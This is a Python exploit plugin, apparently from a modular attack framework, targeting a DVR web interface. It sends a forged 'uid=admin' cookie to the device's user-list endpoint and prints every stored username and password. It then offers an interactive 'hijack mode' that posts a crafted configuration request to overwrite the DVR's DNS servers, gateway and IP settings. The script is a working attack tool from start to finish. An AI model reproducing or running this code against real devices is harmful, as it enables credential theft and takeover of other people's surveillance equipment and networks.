#!/usr/bin/python
Description = 'A DVR Vulnerability to expose credentials and hijack network.'
from plugin_support import *
import requests
import json
import urllib
	
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
	'Cookie':'uid=admin'
}
try:
	default = "yes"
	r = requests.get("http://" + ask.target + "/device.rsp?opt=user&cmd=list", headers=headers)
	obj = json.loads(r.text)
	totUsr = len(obj["list"])
	for dd in range(0,totUsr):
		user = obj["list"][dd]["uid"]
		password   = obj["list"][dd]["pwd"]
		success("Username: " + user)
		success("Password: " + password)
	option = raw_input("\033[0;37m[?]\033[0;0m Would you like to enable hijack mode? [" + default + "]: ") or default
	if option == "yes":
		session = raw_input("\033[0;37m[?]\033[0;0m Session token: ")
		print ""
		fdns = raw_input("\033[0;37m[?]\033[0;0m First DNS IP: ")
		ldns = raw_input("\033[0;37m[?]\033[0;0m Second DNS IP: ")
		print ""
		gateway = raw_input("\033[0;37m[?]\033[0;0m DVR Gateway IP: ")
		subnetmask = raw_input("\033[0;37m[?]\033[0;0m DVR Subnet Mask: ")
		ipaddr = raw_input("\033[0;37m[?]\033[0;0m DVR IP: ")
		malicious_hijack = '{"MODULE":"CONFIGMODEL","OPERATION":"SET","PARAMETER":{"NWSM":{"ETHERNET":{"DNS":{"ADNS":"' + fdns + '","PDNS":"' + ldns + '"},"DNSMODE":"0","IPMODE":"0","PIP":{"GATEWAY":"' + gateway + '","IPADDR":"' + ipaddr + '","SUBMASK":"' + subnetmask + '"}}}},"SESSION":"FROMIE"}'
		hijackenc = urllib.quote(malicious_hijack)
		hijack_line = "REQ=" + hijackenc + "&PAGEID=right_set"
		ses = 'EncodingVlaue=; language_ch=false; Crole=2; backup=-1; opt=-1; playback=-1; ptz=-1; role=2; rview=-1; session=' + session + '; uid=admin; view=-1'
		pwnjack = {
			'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
			'Cookie':ses
		}
		x = requests.post("http://" + ask.target + "/getparameter.json", headers=pwnjack, data=hijack_line)
		success("Hijacked.")
		exit()
	else:
		exit()
except KeyboardInterrupt:
	exit()
